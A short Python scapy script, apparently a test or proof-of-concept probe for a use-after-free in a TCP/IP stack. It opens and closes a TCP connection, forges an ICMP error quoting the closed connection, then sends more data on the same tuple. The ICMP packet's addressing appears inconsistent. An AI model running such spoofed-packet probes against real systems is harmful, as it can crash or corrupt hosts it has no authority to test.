# test-icmp-uaf.py
from scapy.all import *

src = "10.0.2.1"
dst = "10.0.2.105"
sport = 12349
dport = 8000

# 1. Establish and close connection
syn = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='S', seq=1000)
synack = sr1(syn, timeout=2, verbose=0)
if not synack or not synack.haslayer(TCP) or synack[TCP].flags != 'SA':
    print("No SYN-ACK received")
    exit(1)
ack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='A', seq=1001, ack=synack[TCP].seq+1)
send(ack)
fin = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='F', seq=1001, ack=synack[TCP].seq+1)
send(fin)
print("Connection closed.")

# 2. Send ICMP error referencing the closed connection
inner = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='A', seq=1001, ack=synack[TCP].seq+1)
icmp_err = IP(src=dst, dst=src)/ICMP(type=3, code=1)/Raw(bytes(inner)[:28])
send(icmp_err)
print("Sent ICMP error referencing closed connection.")

# 3. Send data again to same tuple
data_pkt = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='PA', seq=1002, ack=synack[TCP].seq+1)/Raw(b'UAF?')
send(data_pkt)
print("Sent data after ICMP error.")